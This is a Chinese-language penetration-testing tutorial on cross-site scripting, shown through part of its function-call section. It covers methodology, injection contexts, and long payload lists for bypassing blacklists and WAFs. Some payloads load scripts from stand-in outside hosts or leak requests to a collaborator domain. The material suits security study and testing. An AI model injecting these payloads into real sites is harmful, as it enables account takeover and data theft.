# XSS (Cross Site Scripting)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

如果您对**黑客职业**感兴趣并想要黑掉无法黑掉的东西 - **我们正在招聘！**（需要流利的波兰语书面和口头表达能力）。

{% embed url="https://www.stmcyber.com/careers" %}

## 方法论

1. 检查您控制的**任何值**（_参数_，_路径_，_标头_？，_Cookie_？）是否在 HTML 中**反射**或被 **JS** 代码使用。
2. 找到它被反射/使用的**上下文**。
3. 如果**反射**
4. 检查您可以使用**哪些符号**，并根据此准备有效载荷：
5. 在**原始 HTML**中：
6. 您能创建新的 HTML 标签吗？
7. 您能使用支持 `javascript:` 协议的事件或属性吗？
8. 您能绕过保护措施吗？
9. HTML 内容是否由任何客户端 JS 引擎（_AngularJS_，_VueJS_，_Mavo_...）解释，您可以滥用[**客户端模板注入**](../client-side-template-injection-csti.md)。
10. 如果您无法创建执行 JS 代码的 HTML 标签，您能滥用[**悬挂标记 - HTML 无脚本注入**](../dangling-markup-html-scriptless-injection/)吗？
11. 在**HTML 标签**内：
12. 您能退出到原始 HTML 上下文吗？
13. 您能创建新的事件/属性来执行 JS 代码吗？
14. 您被困在的属性是否支持 JS 执行吗？
15. 您能绕过保护措施吗？
16. 在**JavaScript 代码**内：
17. 您能转义 `<script>` 标签吗？
18. 您能转义字符串并执行不同的 JS 代码吗？
19. 您的输入是否在模板文字中 \`\`？
20. 您能绕过保护措施吗？
21. 正在**执行的** JavaScript **函数**
22. 您可以指定要执行的函数名称。例如：`?callback=alert(1)`
23. 如果**被使用**：
24. 您可以利用**DOM XSS**，注意您的输入如何受控以及您的**受控输入是否被任何接收器使用**。

在处理复杂的 XSS 时，您可能会发现以下内容很有趣：

{% content-ref url="debugging-client-side-js.md" %}
[debugging-client-side-js.md](debugging-client-side-js.md)
{% endcontent-ref %}

## 反射值

要成功利用 XSS，您首先需要找到的是在网页中**反映您控制的值**。

* **中间反射**：如果您发现参数的值甚至路径的值在网页中被反射，您可以利用**反射型 XSS**。
* **存储和反射**：如果您发现您控制的值被保存在服务器中，并且每次访问页面时都被反射，您可以利用**存储型 XSS**。
* **通过 JS 访问**：如果您发现您控制的值正在使用 JS 访问，您可以利用**DOM XSS**。

## 上下文

在尝试利用 XSS 时，您首先需要知道**您的输入在哪里被反射**。根据上下文，您将能够以不同的方式执行任意 JS 代码。

### 原始 HTML

如果您的输入**在原始 HTML**页面上被反射，您需要滥用一些**HTML 标签**以执行 JS 代码：`<img，<iframe，<svg，<script` ... 这些只是您可以使用的许多可能的 HTML 标签。\
此外，请记住[客户端模板注入](../client-side-template-injection-csti.md)。

### 在 HTML 标签属性内部

如果您的输入被反映在标签属性的值内部，您可以尝试：

1. **从属性和标签中逃脱**（然后您将处于原始 HTML 中）并创建新的 HTML 标签以滥用：`"><img [...]`
2. 如果您**可以从属性中逃脱但无法从标签中逃脱**（`>` 被编码或删除），取决于标签，您可以**创建一个事件**来执行 JS 代码：`" autofocus onfocus=alert(1) x="`
3. 如果您**无法从属性中逃脱**（`"` 被编码或删除），则取决于**您的值被反映在哪个属性**以及**您是否控制所有值或仅一部分**，您将能够滥用它。例如，如果您控制像 `onclick=` 这样的事件，您将能够使其在单击时执行任意代码。另一个有趣的**例子**是属性 `href`，您可以使用 `javascript:` 协议来执行任意代码：**`href="javascript:alert(1)"`**
4. 如果您的输入被反映在“**无法利用的标记**”内，您可以尝试使用\*\*`accesskey`**技巧来滥用漏洞（您需要某种社会工程师来利用此漏洞）：**`" accesskey="x" onclick="alert(1)" x="`\*\*

如果您控制类名，Angular 执行 XSS 的奇怪示例：

```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```

### JavaScript 代码内部

在这种情况下，您的输入被反射在 HTML 页面的 **`<script> [...] </script>`** 标签之间，在一个 `.js` 文件内，或者在使用 **`javascript:`** 协议的属性内部：

* 如果被反射在 **`<script> [...] </script>`** 标签之间，即使您的输入被放在任何引号内，您可以尝试注入 `</script>` 并从这个上下文中逃脱。这是因为**浏览器首先解析 HTML 标签**，然后解析内容，因此，它不会注意到您注入的 `</script>` 标签在 HTML 代码内部。
* 如果被反射在 **JS 字符串内部**，并且上一个技巧不起作用，您需要**退出**字符串，**执行**您的代码并**重构**JS代码（如果有任何错误，它不会被执行）：
  * `'-alert(1)-'`
  * `';-alert(1)//`
  * `\';alert(1)//`
* 如果被反射在模板文字内部，您可以使用 `${ ... }` 语法**嵌入 JS 表达式**：`` var greetings = `Hello, ${alert(1)}` ``
* **Unicode 编码**可用于编写**有效的 JavaScript 代码**：

```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```

#### Javascript 提升

Javascript 提升指的是**在使用后声明函数、变量或类的机会，因此您可以利用 XSS 正在使用未声明的变量或函数的情况。**\
**查看以下页面获取更多信息：**

{% content-ref url="js-hoisting.md" %}
[js-hoisting.md](js-hoisting.md)
{% endcontent-ref %}

### Javascript 函数

一些网页端点**接受函数名称作为参数来执行**。在实际中常见的示例是类似这样的：`?callback=callbackFunc`。

要找出用户直接提供的内容是否尝试执行，一个好方法是**修改参数值**（例如为'Vulnerable'），并在控制台中查看是否有错误，如：

![](<../../.gitbook/assets/image (708).png>)

如果存在漏洞，您可以通过发送值\*\*`?callback=alert(1)`**来**触发警报\*\*。然而，这些端点通常会**验证内容**，只允许字母、数字、点和下划线（**`[\w\._]`**）。

然而，即使有这种限制，仍然可以执行一些操作。这是因为您可以使用这些有效字符来**访问 DOM 中的任何元素**：

![](<../../.gitbook/assets/image (744).png>)

一些有用的函数包括：

```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```

您还可以尝试直接**触发Javascript函数**：`obj.sales.delOrders`。

然而，通常执行指定函数的端点是**没有太多有趣DOM**的端点，**同一源中的其他页面**将具有**更有趣的DOM**以执行更多操作。

因此，为了在不同DOM中**滥用此漏洞**，开发了\*\*同源方法执行（SOME）\*\*利用：

{% content-ref url="some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](some-same-origin-method-execution.md)
{% endcontent-ref %}

### DOM

有一些**JS代码**正在**不安全地**使用一些**由攻击者控制的数据**，如`location.href`。攻击者可以利用这一点执行任意JS代码。

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

### **通用XSS**

这种类型的XSS可以在**任何地方**找到。它们不仅仅依赖于对Web应用程序的客户端利用，而是依赖于**任何** **上下文**。这种**任意JavaScript执行**甚至可以被滥用以获得**RCE**，在客户端和服务器上**读取** **任意** **文件**等。\
一些**示例**：

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-web/electron-desktop-apps/" %}
[electron-desktop-apps](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endcontent-ref %}

## WAF绕过编码图像

![来源 https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../.gitbook/assets/EauBb2EX0AERaNK (1).jpg>)

## 在原始HTML中注入

当您的输入被反映在**HTML页面**中或者您可以转义并在此上下文中注入HTML代码时，**第一**件事是检查您是否可以滥用`<`来创建新标签：尝试**反映**该**字符**并检查它是否被**HTML编码**或**删除**，或者是否**未经更改地反映**。**只有在最后一种情况下，您才能利用这种情况**。\
对于这些情况，还要**记住**[**客户端模板注入**](../client-side-template-injection-csti.md)**。**\
_**注意：HTML注释可以使用\*\*\*\***** ****`-->`**** ****或 \*\*\*\*****`--!>`**_

在这种情况下，如果没有使用黑名单/白名单，您可以使用如下有效负载：

```html
<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>
```

但是，如果使用了标签/属性的黑名单/白名单，您将需要**暴力破解可以创建的标签**。\
一旦您**找到了允许的标签**，您将需要**暴力破解找到的有效标签内的属性/事件**，以查看如何攻击上下文。

### 标签/事件的暴力破解

前往[**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)并单击\_**将标签复制到剪贴板**_。然后，使用Burp Intruder发送所有标签，并检查WAF是否未将任何标签识别为恶意。一旦您发现可以使用哪些标签，您可以使用有效标签**暴力破解所有事件**（在同一网页上单击_**将事件复制到剪贴板**\_，然后按照之前的相同步骤操作）。

### 自定义标签

如果您找不到任何有效的HTML标签，您可以尝试**创建自定义标签**并使用`onfocus`属性执行JS代码。在XSS请求中，您需要以`#`结束URL，使页面**聚焦在该对象上**并**执行**代码：

```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```

### 黑名单绕过

如果使用了某种黑名单，您可以尝试使用一些愚蠢的技巧来绕过它：

```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```

### 长度绕过（小型XSS）

{% hint style="info" %}
**更多针对不同环境的微型XSS** 负载[**可以在这里找到**](https://github.com/terjanq/Tiny-XSS-Payloads) 和 [**这里**](https://tinyxss.terjanq.me)。
{% endhint %}

```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``>
<script src=//aa.es>
<script src=//℡㏛.pw>
```

最后一个是使用2个Unicode字符，扩展为5个：telsr\
更多这些字符可以在[这里](https://www.unicode.org/charts/normalization/)找到。\
要检查哪些字符被分解，请查看[这里](https://www.compart.com/en/unicode/U+2121)。

### 点击XSS - 点击劫持

如果为了利用漏洞，您需要**用户点击一个带有预填数据的链接或表单**，您可以尝试[**滥用点击劫持**](../clickjacking.md#xss-clickjacking)（如果页面存在漏洞）。

### 不可能 - 悬挂标记

如果您认为**不可能创建一个带有执行JS代码属性的HTML标记**，您应该检查[**悬挂标记**](../dangling-markup-html-scriptless-injection/)，因为您可以**利用**漏洞而**无需**执行**JS**代码。

## 在HTML标记内注入

### 在标记内部/从属性值中逃逸

如果您在**HTML标记内部**，您可以尝试首先**从标记中逃逸**，并使用[前一节](./#injecting-inside-raw-html)中提到的一些技术来执行JS代码。\
如果您**无法从标记中逃逸**，您可以在标记内创建新属性，尝试执行JS代码，例如使用一些有效载荷（_请注意，在此示例中，双引号用于从属性中逃逸，如果您的输入直接反映在标记内，则不需要它们_）：

```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```

**样式事件**

在XSS攻击中，可以利用样式事件来执行恶意脚本。例如，可以通过`<img>`标签的`onerror`事件来触发恶意脚本。

```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```

### 在属性中

即使**无法从属性中逃脱**（`"`被编码或删除），取决于**值被反映在哪个属性中**，如果您控制所有值或只是一部分，您将能够滥用它。例如，如果您控制像`onclick=`这样的事件，您将能够使其在被点击时执行任意代码。\
另一个有趣的例子是属性`href`，您可以使用`javascript:`协议来执行任意代码：**`href="javascript:alert(1)"`**

**在事件内部使用HTML编码/URL编码绕过**

HTML标签属性值中的**HTML编码字符**在运行时会被**解码**。因此，类似以下内容将是有效的（payload以粗体显示）：`<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

请注意**任何类型的HTML编码都是有效的**：

```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```

**请注意，URL 编码也可以起作用：**

```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```

**使用Unicode编码绕过内部事件**

```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```

### 在属性中使用特殊协议

在某些地方，您可以使用协议\*\*`javascript:`**或**`data:`**来**执行任意的JS代码\*\*。有些情况下需要用户交互，有些则不需要。

```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```

**可以注入这些协议的位置**

**一般来说**，`javascript:` 协议可以**用于接受属性 `href`** 的任何标签中，并且可以用于**大多数**接受属性 `src` 的标签中（但不包括 `<img`）

```markup
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```

**其他混淆技巧**

_**在这种情况下，HTML编码和前一节中的Unicode编码技巧同样有效，因为您位于属性内部。**_

```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```

此外，对于这些情况还有另一个**不错的技巧**：**即使你在`javascript:...`中的输入被URL编码，它在执行之前会被URL解码。因此，如果你需要使用单引号**从**字符串**中**转义**，并且发现**它被URL编码**，请记住**这并不重要**，在**执行**时它将被解释为**单引号**。

```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```

请注意，如果您尝试以任何顺序使用`URLencode + HTMLencode`来编码**payload**，它**不会**起作用，但您可以在**payload**中**混合使用它们**。

**使用十六进制和八进制编码与`javascript:`**

您可以在`iframe`的`src`属性中（至少）使用**十六进制**和**八进制编码**来声明**执行JS的HTML标签**：

```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```

### 反向标签窃取

```javascript
<a target="_blank" rel="opener"
```

如果您可以在包含\*\*`target="_blank"`**和**`rel="opener"`**属性的任意**`<a href=`**标签中注入任何URL，请检查**以下页面以利用此行为\*\*：

{% content-ref url="../reverse-tab-nabbing.md" %}
[reverse-tab-nabbing.md](../reverse-tab-nabbing.md)
{% endcontent-ref %}

### on Event Handlers Bypass

首先检查此页面（[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)）以获取有用的\*\*"on"事件处理程序\*\*。\
如果有一些黑名单阻止您创建这些事件处理程序，您可以尝试以下绕过方法：

```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```

### 在“无法利用的标签”中的 XSS（隐藏输入、链接、规范、元标记）

从[**这里**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **现在可以滥用隐藏输入，包括：**

```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle=alert(1)>
```

并且在**元标签**中：

```html
<!-- Injection inside meta attribute-->
<meta name="apple-mobile-web-app-title" content=""Twitter popover id="newsletter" onbeforetoggle=alert(2) />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```

从[**这里**](https://portswigger.net/research/xss-in-hidden-input-fields)：您可以在隐藏属性中执行**XSS有效负载**，只要您能**说服** **受害者**按下**键组合**。在Firefox Windows/Linux上，键组合是**ALT+SHIFT+X**，在OS X上是**CTRL+ALT+X**。您可以使用访问键属性中的不同键指定不同的键组合。以下是向量：

```markup
<input type="hidden" accesskey="X" onclick="alert(1)">
```

**XSS负载将类似于这样：`" accesskey="x" onclick="alert(1)" x="`**

### 黑名单绕过

在本节中已经揭示了使用不同编码的几种技巧。回到学习以下内容：

* **HTML编码（HTML标记）**
* **Unicode编码（可以是有效的JS代码）：** `\u0061lert(1)`
* **URL编码**
* **十六进制和八进制编码**
* **数据编码**

**用于HTML标记和属性的绕过**

阅读[上一节的黑名单绕过](./#blacklist-bypasses)。

**用于JavaScript代码的绕过**

阅读下一节的[JavaScript绕过黑名单技术](./#javascript-bypass-blacklists-techniques)。

### CSS小工具

如果在网页的一个非常小的部分中发现了XSS（可能是页脚中的一个小链接，带有onmouseover元素），您可以尝试**修改该元素占用的空间**，以最大化链接被触发的可能性。

例如，您可以在元素中添加一些样式，如：`position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

但是，如果WAF正在过滤style属性，您可以使用CSS样式小工具，例如，如果您找到了

> .test {display:block; color: blue; width: 100%\}

和

> \#someid {top: 0; font-family: Tahoma;}

现在您可以修改我们的链接，将其改为

> \<a href="" id=someid class=test onclick=alert() a="">

这个技巧取自[https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## 在JavaScript代码中注入

在这些情况下，您的**输入**将被\*\*反射到`.js`文件或`<script>...</script>`标记之间的JS代码中，或者在可以执行JS代码的HTML事件之间，或者在接受`javascript:`协议的属性之间。

### 转义\<script>标记

如果您的代码插入在`<script> [...] var input = 'reflected data' [...] </script>`中，您可以轻松地\*\*转义关闭`<script>`\*\*标记：

```javascript
</script><img src=1 onerror=alert(document.domain)>
```

注意，在这个例子中，我们甚至**还没有关闭单引号**。这是因为**浏览器首先执行HTML解析**，这涉及识别页面元素，包括脚本块。对于理解和执行嵌入式脚本的JavaScript的解析是在此之后才进行的。

### 在JS代码内部

如果`<>`被消毒，您仍然可以**转义字符串**，在您的输入位置**执行任意JS**。重要的是**修复JS语法**，因为如果有任何错误，JS代码将不会被执行：

```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```

### 模板文字 \`\`

为了构建**字符串**，除了单引号和双引号外，JS还接受**反引号** **` `` `**。这被称为模板文字，因为它们允许使用`${ ... }`语法**嵌入JS表达式**。\
因此，如果您发现您的输入被**反射**到使用反引号的JS字符串中，您可以滥用`${ ... }`语法来执行**任意JS代码**：

这可以通过以下方式**滥用**：

```javascript
`${alert(1)}`
`${`${`${`${alert(1)}`}`}`}`
```

```````````````javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop(){return loop}
loop``````````````
```````````````

### 编码代码执行

```markup
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>">
```

### Unicode编码JS执行

```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```

### JavaScript绕过黑名单技术

**字符串**

```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```

**特殊转义**

```javascript
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
// Any other char escaped is just itself
```

**JS代码中的空格替换**

```javascript
<TAB>
/**/
```

**JavaScript注释（来自** [**JavaScript注释**](./#javascript-comments) **技巧）**

```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```

**JavaScript新行（来自** [**JavaScript新行**](./#javascript-new-lines) **技巧）**

```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10); alert('//\nalert(1)') //0x0a
String.fromCharCode(13); alert('//\ralert(1)') //0x0d
String.fromCharCode(8232); alert('//\u2028alert(1)') //0xe2 0x80 0xa8
String.fromCharCode(8233); alert('//\u2029alert(1)') //0xe2 0x80 0xa9
```

**JavaScript空白字符**

```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```

**注释中的Javascript**

```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```

**没有括号的JavaScript**

````javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x```

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.
````

* [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
* [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**调用任意函数（alert）**

````javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
